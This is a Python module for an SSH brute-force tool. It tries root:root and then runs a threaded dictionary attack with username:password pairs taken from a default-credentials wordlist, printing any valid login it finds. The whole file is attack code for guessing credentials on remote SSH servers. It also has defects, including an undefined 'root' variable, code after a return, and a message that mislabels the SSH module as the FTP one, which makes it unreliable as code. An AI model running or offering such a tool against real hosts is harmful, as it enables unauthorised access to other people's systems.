from colorama import Fore,Back,Style
import paramiko, sys, os, socket
import threading, time


thres_ = 0
fd=0

def connectionerror(target,port):
    print(Back.RED+"--|! Error when connecting to "+target+" on port "+str(port)+Back.RESET)
    quit()

def rootcheck(target,port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:        
        ssh.connect(target, port=port, username=root, password=root)
        return True
        ssh.connect(target, port=port, username=root, password="")
        return True
    except:
        return False
        
def brute(target,port,user,password,tc):
    global fd
    global thres_
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=port, username=user, password=password)
        thres_ = 1
        print(Fore.GREEN+"--|* Found valid login "+user+":"+password+Fore.RESET)
        fd=1
    except socket.error as e:
        connectionerror(target,port)
    except paramiko.SSHException as f:
        if (fd!=1): 
            combo=str(user+":"+password)
            print(Fore.CYAN+"--|i Trying ",end=""); print(combo,end='\r'); print(Fore.RESET,end="")
            #print(Fore.GREEN+tc," Active Threads"+Fore.RESET,end='\r')
        ssh.close()
    except KeyboardInterrupt:
        print("\n"+Back.RED+"--|! CTRL-C! exiting"+Back.RESET)
        sys.exit()
    #except:
    return False

def done():
    print(Fore.RED+Style.BRIGHT+"--|1 Ftp Module Finished!1|--"+Fore.RESET)
    
    
def sshc(target,port,inl):
    fd=0
    print(Back.WHITE+Fore.RED+Style.BRIGHT+"--|0 Starting SSH Module 0|--"+Back.RESET+Fore.RESET)
    if (rootcheck(target,port)==True):
        print(Fore.GREEN+Style.BRIGHT+"--|* root:root is a valid login on "+target+Fore.RESET)
    if (inl==2):
        print(Fore.CYAN+"--|i Starting Threaded Dictionary attack on "+target+Fore.RESET)
        usernames=[]
        passwords=[]
        with open("docs/seclists-default.txt", "r") as wl:
            for line in wl: 
                lline=line.split(":",1)[0]
                usernames.append(lline)
                llline=line[len(lline)+1:-1]
                passwords.append(llline)
        for user in usernames:
            for password in passwords:
                if thres_ == 1:
                    t.join()
                    break        
                tc=str(threading.active_count())
                t = threading.Thread(target=brute, args=(target,port,user,password,tc))
                t.start()
                time.sleep(0.5)
    done()




